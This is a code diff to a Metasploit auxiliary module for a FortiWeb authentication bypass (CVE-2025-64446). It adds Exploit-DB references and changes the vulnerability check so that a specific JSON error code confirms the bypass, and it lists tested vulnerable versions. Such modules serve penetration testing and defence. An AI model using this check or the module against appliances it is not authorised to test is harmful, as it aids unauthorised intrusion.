@@ -32,6 +32,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'References' => [
           ['CVE', '2025-64446'],
+          ['EDB', '52495'],
+          ['EDB', '52502'],
           ['URL', 'https://x.com/defusedcyber/status/1975242250373517373'], # Original PoC posted online
           ['URL', 'https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass'], # PoC
           ['URL', 'https://www.pwndefend.com/2025/11/13/suspected-fortinet-zero-day-exploited-in-the-wild/'],
@@ -70,11 +72,18 @@ class MetasploitModule < Msf::Auxiliary
   def check
     res = post_auth_bypass_request({ data: {} })
 
-    return CheckCode::Unknown('Connection failed') unless res
+    return Exploit::CheckCode::Unknown('Connection failed') unless res
 
     return Exploit::CheckCode::Safe('Received a 403 Forbidden response') if res.code == 403
 
-    Exploit::CheckCode::Appears
+    j = JSON.parse(res.body)
+
+    # Tested against vulnerable FortiWeb versions 8.0.1, 7.4.8, 6.4.3, and 6.3.9
+    return Exploit::CheckCode::Appears('Authentication bypass succeeded on FortiWeb') if j.dig('results', 'errcode') == -56
+
+    Exploit::CheckCode::Unknown('Unexpected JSON results')
+  rescue JSON::ParserError
+    return Exploit::CheckCode::Unknown('Failed to parse JSON body')
   end
 
   def run
